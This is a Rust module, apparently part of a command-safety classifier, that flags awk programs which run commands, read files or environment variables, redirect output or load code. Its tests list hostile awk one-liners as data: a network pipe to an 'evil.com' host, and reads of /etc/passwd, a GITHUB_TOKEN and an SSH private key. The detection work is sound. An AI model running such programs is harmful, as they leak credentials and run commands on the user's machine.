//! `awk`: the program is data, never shell or file names.
//!
//! An awk program prints, except where it runs a command (`system()`, `|`
//! pipes, gawk's `|&`), redirects output to a file (`print > "f"`), reads a
//! file or a variable the command line does not name (`getline`, `ENVIRON`,
//! assigning `ARGV`), or loads code (`@include`, `@load`, gawk's indirect call
//! `@f()`). These are found by their words in the raw program text, strings and
//! regexes included, so no quoting can hide one; a word inside a string only
//! costs a prompt. Such a program, `-f FILE` and any option but `-F` and `-v`
//! become an `awk @<text>` atom. awk stops reading options at the program.

use super::text::{Arg, Operands, Spec, parse, unproven};
use super::{ClassifyError, Sink};

const AWK: Spec = Spec {
    flags: "",
    valued: "Fv",
    optional: "",
    long_flags: &[],
    long_valued: &[],
    long_optional: &[],
    permute: false,
};

/// Words that run a command, read a file or a variable, or load code. `|` is
/// looked for once every `||` (logical or) is taken out.
const UNSAFE: &[&str] = &["system", "getline", "ENVIRON", "ARGV", "@", "|"];

pub(super) fn classify(argv: &[String], sink: &mut Sink) -> Result<Operands, ClassifyError> {
    let mut ops = Operands::default();
    let mut program = None;
    for arg in parse(argv, &AWK) {
        match arg {
            Arg::Opt { data, .. } => ops.data.extend(data),
            Arg::Unknown(word) => unproven(argv, word, sink)?,
            Arg::Operand(at) => {
                program.get_or_insert(at);
            }
        }
    }
    if let Some(at) = program {
        ops.data.push(at);
        if !harmless(&argv[at]) {
            unproven(argv, &argv[at], sink)?;
        }
    }
    Ok(ops)
}

/// No unsafe word, and no `>` after the first `print`: output redirection
/// only exists in `print` and `printf`, and a `>` before them is a comparison.
fn harmless(program: &str) -> bool {
    let text = program.replace("||", "");
    let printing = program.find("print").map_or("", |at| &program[at..]);
    !UNSAFE.iter().any(|word| text.contains(word)) && !printing.contains('>')
}

#[cfg(test)]
mod tests {
    use super::harmless;

    #[test]
    fn printing_programs() {
        for program in [
            "{print $1}",
            "$3 > 100 {print $1}",
            "/error/ {n++} END {print n}",
            "NR > 1 && ($2 == \"x\" || $2 == \"y\") {sum += $4} END {printf \"%d\\n\", sum}",
            "BEGIN {FS=\",\"} {print $2, length($0)}",
        ] {
            assert!(harmless(program), "{program}");
        }
    }

    #[test]
    fn programs_that_may_do_more() {
        for program in [
            "BEGIN{system(\"id\")}",
            "{print | \"sh\"}",
            "{print |& \"/inet/tcp/0/evil.com/80\"}",
            "BEGIN{\"id\" | getline x; print x}",
            "{getline line < \"/etc/passwd\"}",
            "{print > \"/tmp/x\"}",
            "{printf \"%s\", $0 >> \"log\"}",
            "BEGIN{print ENVIRON[\"GITHUB_TOKEN\"]}",
            "BEGIN{ARGV[1]=\"/Users/me/.ssh/id_rsa\"; ARGC=2} {print}",
            "@include \"lib.awk\"",
            "BEGIN{f=\"sys\" \"tem\"; @f(\"id\")}",
        ] {
            assert!(!harmless(program), "{program}");
        }
    }
}
